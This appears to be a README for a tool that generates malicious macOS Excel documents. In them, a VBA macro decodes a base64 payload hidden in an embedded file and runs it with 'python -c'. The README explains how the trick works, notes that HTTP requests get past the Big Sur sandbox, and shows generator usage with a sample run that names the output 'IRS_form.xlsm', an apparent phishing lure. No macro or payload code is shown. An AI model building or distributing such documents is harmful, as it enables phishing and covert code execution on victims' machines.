# macOS VBA Macro

### Overview

An example VBA macro for macOS Big Sur.

DISCLAIMER: This software may contain bugs, both apparent and less apparent ones. 
I do not accept responsibility for any problems that arise from use of this 
software. Use entirely at your own risk.

The template excel document contains a macro targeting macOS. The macro expects a 
base64 encoded payload to exist at xl/embeddings/Microsoft_Word_Document2.docx. It 
will then base64 decode and run the script as a one-liner in a python command 
(python -c "command"). Note: macOS Big Sur doesn't allow any child processes from 
MS Excel to establish a socket. Normal get/post request are ok.

### Technologies:
MS Excel, Python, Visual Basic for Applications.

### Generate from the Python script

> malware $python generate-malware.py -h
Usage: generate-malware.py [options]

> Options:
  -h, --help            show this help message and exit
  -p PAYLOAD_FILENAME, --payload=PAYLOAD_FILENAME
  -t TEMPLATE_FILENAME, --template=TEMPLATE_FILENAME
  -o OUTPUT_FILENAME, --output=OUTPUT_FILENAME
malware $python generate-malware.py -p ../python_payload.bin 
template-doc/Workbook1.xlsm
temp.0.352844482538/payload.tmp

> Successful

> Saved as temp.0.352844482538/IRS_form.xlsm
